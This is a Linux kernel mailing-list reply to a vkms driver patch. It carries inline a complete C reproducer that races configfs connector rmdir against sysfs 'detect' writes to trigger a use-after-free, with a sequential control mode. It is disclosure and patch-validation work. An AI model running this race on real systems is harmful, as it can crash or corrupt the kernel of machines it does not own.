Return-Path: <dri-devel-bounces@lists.freedesktop.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 1CD3CC531CB
	for <dri-devel@archiver.kernel.org>; Thu, 23 Jul 2026 07:08:08 +0000 (UTC)
Received: from gabe.freedesktop.org (localhost [127.0.0.1])
	by gabe.freedesktop.org (Postfix) with ESMTP id 20B7510EFE6;
	Thu, 23 Jul 2026 07:07:58 +0000 (UTC)
Authentication-Results: gabe.freedesktop.org;
	dkim=pass (1024-bit key; unprotected) header.d=auditcode.ai header.i=security@auditcode.ai header.b="Fs89nZAv";
	dkim-atps=neutral
Received: from sender-op-o19.zoho.eu (sender-op-o19.zoho.eu [136.143.169.19])
 by gabe.freedesktop.org (Postfix) with ESMTPS id CC05C10E493
 for <dri-devel@lists.freedesktop.org>; Wed, 22 Jul 2026 18:44:07 +0000 (UTC)
ARC-Seal: i=1; a=rsa-sha256; t=1784745845; cv=none; d=zohomail.eu; s=zohoarc; 
 b=TMxEmvW3vaz0wXvKKcuiv0bZlOJZwdF6qpFyvD6LoMpCi03GOMWKx4srrJPd+x5yHqYQRPvUA4PzrAldZG1LQE/oJl29KEpdJRG9DPoD3AUVl0gTgazAwTde6k3M8+AEtomhJPUTaZ+5cvsSJKf0AsYZUzrLieai8zvK1zlzuPQ=
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=zohomail.eu;
 s=zohoarc; t=1784745845;
 h=Content-Type:Content-Transfer-Encoding:Cc:Cc:Date:Date:From:From:In-Reply-To:MIME-Version:Message-ID:Subject:Subject:To:To:Message-Id:Reply-To;
 bh=VxHyNDk1tcCPO7ja/87AwBaUgcqxysM8Q+45b1bFN9c=; 
 b=VvV8wgrnSA5ZZGX75pgrSJa6JpUdOqB4fwq8XdGBVN6FKuEsLGNt4RcQ18Y+U7fYflMglv9XhEh+U/NczRhzp3HdeDJUsgseoiV4zTtFuxjlvFwg/jSLl9oaNx2WNB6IWuK+7N5kS7KZmTUGftj/bZxYM6J4G3Kc9Kl2qmAJvcA=
ARC-Authentication-Results: i=1; mx.zohomail.eu;
 dkim=pass  header.i=auditcode.ai;
 spf=pass  smtp.mailfrom=security@auditcode.ai;
 dmarc=pass header.from=<security@auditcode.ai>
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; t=1784745845; 
 s=zmail; d=auditcode.ai; i=security@auditcode.ai;
 h=From:From:To:To:Cc:Cc:Subject:Subject:Date:Date:Message-ID:In-Reply-To:MIME-Version:Content-Type:Content-Transfer-Encoding:Message-Id:Reply-To;
 bh=VxHyNDk1tcCPO7ja/87AwBaUgcqxysM8Q+45b1bFN9c=;
 b=Fs89nZAvCb5maizGKSYVyLZTkOSHb1SgJOtr0WRHAbh/9ISCYNMuZ5mRS6HxwpI5
 ilylFMLZX/dCsBhAROSV/3JsLQZ3zwJri8ueI3/agTpHoTX3e2X+cL5bJpQtZe+fI0f
 vtIif3C1ppuWM3o6ktGLVe6ar88Fu1PBGo8huJhc=
Received: by mx.zoho.eu with SMTPS id 1784745842452778.5896991038773;
 Wed, 22 Jul 2026 20:44:02 +0200 (CEST)
From: Ibrahim Hashimov <security@auditcode.ai>
To: louis.chauvet@bootlin.com
Cc: hamohammed.sa@gmail.com, simona@ffwll.ch, melissa.srw@gmail.com,
 mripard@kernel.org, dri-devel@lists.freedesktop.org,
 linux-kernel@vger.kernel.org
Subject: Re: [PATCH v2] drm/vkms: Fix UAF between connector configfs rmdir and
 .detect
Date: Wed, 22 Jul 2026 20:42:41 +0200
Message-ID: <20260722184357.40904-1-security@auditcode.ai>
X-Mailer: git-send-email 2.50.1
In-Reply-To: <3adb0a99-95c0-41dd-a701-efaff37e74b5@bootlin.com>
References: <3adb0a99-95c0-41dd-a701-efaff37e74b5@bootlin.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-ZohoMailClient: External
X-Mailman-Approved-At: Thu, 23 Jul 2026 07:07:31 +0000
X-BeenThere: dri-devel@lists.freedesktop.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Direct Rendering Infrastructure - Development
 <dri-devel.lists.freedesktop.org>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/dri-devel>
List-Post: <mailto:dri-devel@lists.freedesktop.org>
List-Help: <mailto:dri-devel-request@lists.freedesktop.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=subscribe>
Errors-To: dri-devel-bounces@lists.freedesktop.org
Sender: "dri-devel" <dri-devel-bounces@lists.freedesktop.org>

Here's the reproducer, inline.

  gcc -O2 -o vkms_uaf vkms_connector_uaf.c
  modprobe vkms
  mount -t configfs none /sys/kernel/config   # if not already mounted
  ./vkms_uaf exploit    # concurrent  -> UAF on an unpatched KASAN build
  ./vkms_uaf control    # sequential  -> same work, stays clean

It builds a vkms device with a batch of connectors, keeps writing "detect"
to one connector's status (which walks the whole config->connectors list)
while rmdir'ing the other connectors out from under that walk. On an
unpatched KASAN + DEBUG_LIST build it splats slab-use-after-free in
vkms_connector_detect fairly quickly here (a couple of minutes on a 2-CPU
guest). The control run does the identical work sequentially, so the only
variable is the concurrency.

Needs CONFIG_DRM_VKMS=m, CONFIG_CONFIGFS_FS=y, and ideally CONFIG_KASAN=y +
CONFIG_DEBUG_LIST=y to see the splat; run it as root (configfs is root-only).

---8<--- vkms_connector_uaf.c ---8<---
// vkms: configfs connector rmdir vs vkms_connector_detect UAF race
//
// Bug (v6.19, gpu/drm/vkms):
//   connector_release()  (vkms_configfs.c:568-580)  --rmdir of a connector cfgfs dir-->
//       scoped_guard(mutex, &dev->lock){ vkms_config_destroy_connector(cfg); kfree(connector); }
//       vkms_config_destroy_connector (vkms_config.c:608-613): list_del(&cfg->link); kfree(cfg);
//   vkms_connector_detect() (vkms_connector.c:11-34) iterates the SAME live
//       config->connectors list with vkms_config_for_each_connector == plain
//       list_for_each_entry (vkms_config.h:152-153), holding NO lock (not dev->lock,
//       not RCU). detect is reachable by writing "detect" to
//       /sys/class/drm/<card-conn>/status (drm_sysfs.c status_store -> fill_modes
//       -> drm_helper_probe_single_connector_modes -> .detect).
//   => the unlocked list walk in detect races the locked list_del+kfree in
//      connector_release on the same object -> CWE-362 -> CWE-416 UAF read
//      (and/or CONFIG_DEBUG_LIST __list_del_entry corruption splat).
//
// The mutating (rmdir) side needs root (configfs is root-owned 0755); attacker
// model per the finding is local root / CAP_SYS_ADMIN. We run as root in the VM.
//
// CONTROL vs EXPLOIT: the ONLY differential is concurrency.
//   EXPLOIT  : detect-hammer child runs CONCURRENTLY with the rmdir loop (fork).
//   CONTROL  : the SAME detect-hammer and the SAME rmdir loop run SEQUENTIALLY
//              (hammer finishes, then rmdir) -> the iterator never overlaps the
//              locked list_del+kfree -> no UAF.
//
// Oracle = kasan: a win aborts the guest with a KASAN slab-use-after-free (or a
// DEBUG_LIST/list_del corruption) splat in vkms_connector_detect / __list_*.
// Userspace cannot observe the win (the kernel panics via panic_on_warn before
// the racing syscall returns), so the splat in the console log IS the proof.
// A miss just loops until the deadline and exits 0 (not a failure).

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdint.h>
#include <time.h>
#include <signal.h>
#include <sys/syscall.h>

#define VBASE "/sys/kernel/config/vkms"
#define DRMDIR "/sys/class/drm"
#define DEVNAME "r"
#define DEVDIR VBASE "/" DEVNAME
#define NCONN 31

/* pin the calling task to a single CPU so the detect-walk and the rmdir free
 * run on different cores for a real, wide overlap window (smp>=2). */
static void pin_cpu(int cpu)
{
	unsigned long mask = 1UL << cpu;
	syscall(SYS_sched_setaffinity, 0, sizeof(mask), &mask);
}

static int wfile(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0)
		return -1;
	ssize_t n = write(fd, val, strlen(val));
	int e = errno;
	close(fd);
	if (n < 0) { errno = e; return -1; }
	return 0;
}

/* build a fresh, minimally-valid vkms device 'r' with NCONN connectors.
 * layout that passes vkms_config_is_valid():
 *   1 primary plane (type=1) with possible_crtcs -> c0
 *   1 crtc c0
 *   1 encoder e0 with possible_crtcs -> c0
 *   NCONN connectors n0..n{NCONN-1} each possible_encoders -> e0
 */
static int build_device(void)
{
	char p[512], tgt[512];

	if (mkdir(DEVDIR, 0755) < 0 && errno != EEXIST) return -1;

	if (mkdir(DEVDIR "/planes/p0", 0755) < 0 && errno != EEXIST) return -1;
	if (wfile(DEVDIR "/planes/p0/type", "1") < 0) return -1; /* PRIMARY */

	if (mkdir(DEVDIR "/crtcs/c0", 0755) < 0 && errno != EEXIST) return -1;
	if (mkdir(DEVDIR "/encoders/e0", 0755) < 0 && errno != EEXIST) return -1;

	/* plane possible_crtcs -> c0 */
	snprintf(tgt, sizeof tgt, DEVDIR "/crtcs/c0");
	if (symlink(tgt, DEVDIR "/planes/p0/possible_crtcs/l") < 0 && errno != EEXIST) return -1;
	/* encoder possible_crtcs -> c0 */
	if (symlink(tgt, DEVDIR "/encoders/e0/possible_crtcs/l") < 0 && errno != EEXIST) return -1;

	/* connectors, each possible_encoders -> e0 */
	snprintf(tgt, sizeof tgt, DEVDIR "/encoders/e0");
	for (int i = 0; i < NCONN; i++) {
		snprintf(p, sizeof p, DEVDIR "/connectors/n%d", i);
		if (mkdir(p, 0755) < 0 && errno != EEXIST) return -1;
		snprintf(p, sizeof p, DEVDIR "/connectors/n%d/possible_encoders/l", i);
		if (symlink(tgt, p) < 0 && errno != EEXIST) return -1;
	}
	return 0;
}

static int enable_device(void)
{
	return wfile(DEVDIR "/enabled", "1");
}

/* best-effort teardown; ignores errors (exploit already removed some connectors) */
static void teardown_device(void)
{
	char p[512];
	wfile(DEVDIR "/enabled", "0");
	for (int i = 0; i < NCONN; i++) {
		snprintf(p, sizeof p, DEVDIR "/connectors/n%d/possible_encoders/l", i); unlink(p);
		snprintf(p, sizeof p, DEVDIR "/connectors/n%d", i); rmdir(p);
	}
	unlink(DEVDIR "/encoders/e0/possible_crtcs/l"); rmdir(DEVDIR "/encoders/e0");
	unlink(DEVDIR "/planes/p0/possible_crtcs/l"); rmdir(DEVDIR "/planes/p0");
	rmdir(DEVDIR "/crtcs/c0");
	rmdir(DEVDIR);
}

/* connector sysfs names contain a '-' (e.g. "card1-Virtual-1"); plain cards
 * ("card1") do not. snapshot the set of connector dirs. */
#define MAXSNAP 512
static char snap[MAXSNAP][80];
static int nsnap;

static void snapshot(void)
{
	nsnap = 0;
	DIR *d = opendir(DRMDIR);
	if (!d) return;
	struct dirent *e;
	while ((e = readdir(d)) && nsnap < MAXSNAP) {
		if (strchr(e->d_name, '-') && strncmp(e->d_name, "card", 4) == 0)
			snprintf(snap[nsnap++], 80, "%s", e->d_name);
	}
	closedir(d);
}

static int in_snap(const char *name)
{
	for (int i = 0; i < nsnap; i++)
		if (strcmp(snap[i], name) == 0)
			return 1;
	return 0;
}

/* find a connector-status path that appeared since snapshot() */
static int find_new_status(char *out, size_t outlen)
{
	DIR *d = opendir(DRMDIR);
	if (!d) return -1;
	struct dirent *e;
	int found = -1;
	while ((e = readdir(d))) {
		if (!strchr(e->d_name, '-') || strncmp(e->d_name, "card", 4) != 0)
			continue;
		if (in_snap(e->d_name))
			continue;
		char cand[512];
		snprintf(cand, sizeof cand, DRMDIR "/%s/status", e->d_name);
		if (access(cand, W_OK) == 0) {
			snprintf(out, outlen, "%s", cand);
			found = 0;
			break;
		}
	}
	closedir(d);
	return found;
}

/* tight detect-reprobe loop on one connector status file; whole config list is
 * walked on every write regardless of which connector we poke. */
static void hammer_detect(const char *status, volatile int *stop, int budget)
{
	int fd = open(status, O_WRONLY);
	if (fd < 0)
		return;
	long i = 0;
	while (1) {
		if (stop && *stop) break;
		if (budget && i >= budget) break;
		lseek(fd, 0, SEEK_SET);
		if (write(fd, "detect", 6) < 0) {
			/* connector may disappear on device destroy; keep going */
		}
		i++;
	}
	close(fd);
}

/* rmdir connectors n1..n{NCONN-1} as fast as possible (n0 kept as a stable
 * probe target). each rmdir triggers connector_release -> list_del + kfree. */
static void rmdir_connectors(void)
{
	char p[512];
	for (int i = 1; i < NCONN; i++) {
		snprintf(p, sizeof p, DEVDIR "/connectors/n%d/possible_encoders/l", i);
		unlink(p);
		snprintf(p, sizeof p, DEVDIR "/connectors/n%d", i);
		rmdir(p);
	}
}

int main(int argc, char **argv)
{
	int concurrent = (argc > 1 && strcmp(argv[1], "exploit") == 0);
	const char *mode = concurrent ? "exploit" : "control";
	setvbuf(stdout, NULL, _IONBF, 0);

	/* one validated round first: if we cannot even build+enable, it is a real
	 * setup failure -> exit 3 so run.sh surfaces SETUP-FAIL. */
	teardown_device();
	if (build_device() < 0) {
		printf("SETUP-FAIL build_device errno=%d (%s)\n", errno, strerror(errno));
		return 3;
	}
	snapshot();
	if (enable_device() < 0) {
		printf("SETUP-FAIL enable errno=%d (%s)\n", errno, strerror(errno));
		teardown_device();
		return 3;
	}
	char status[512];
	if (find_new_status(status, sizeof status) < 0) {
		printf("SETUP-FAIL no new connector status file after enable\n");
		teardown_device();
		return 3;
	}
	printf("[%s] setup OK, probe=%s NCONN=%d\n", mode, status, NCONN);
	teardown_device();

	int secs = concurrent ? 175 : 10;
	time_t deadline = time(NULL) + secs;
	long iter = 0;

	while (time(NULL) < deadline) {
		teardown_device();
		if (build_device() < 0) { teardown_device(); continue; }
		snapshot();
		if (enable_device() < 0) { teardown_device(); continue; }
		if (find_new_status(status, sizeof status) < 0) { teardown_device(); continue; }

		if (concurrent) {
			/* DIFFERENTIAL: detect walk runs CONCURRENTLY with rmdir,
			 * pinned to separate CPUs for a wide overlap window. */
			pid_t c = fork();
			if (c == 0) {
				pin_cpu(0);
				hammer_detect(status, NULL, 0); /* until killed */
				_exit(0);
			}
			pin_cpu(1);
			rmdir_connectors();
			kill(c, SIGKILL);
			waitpid(c, NULL, 0);
		} else {
			/* CONTROL: same work, SEQUENTIAL — no overlap, no race */
			int stop = 0;
			hammer_detect(status, &stop, 1500);
			rmdir_connectors();
		}

		teardown_device();
		iter++;
		if (iter % 25 == 0)
			printf("ITER=%ld mode=%s\n", iter, mode);
	}

	printf("done mode=%s iters=%ld (no splat -> miss; kasan splat, if any, is above)\n",
	       mode, iter);
	return 0;
}

---8<---

Ibrahim
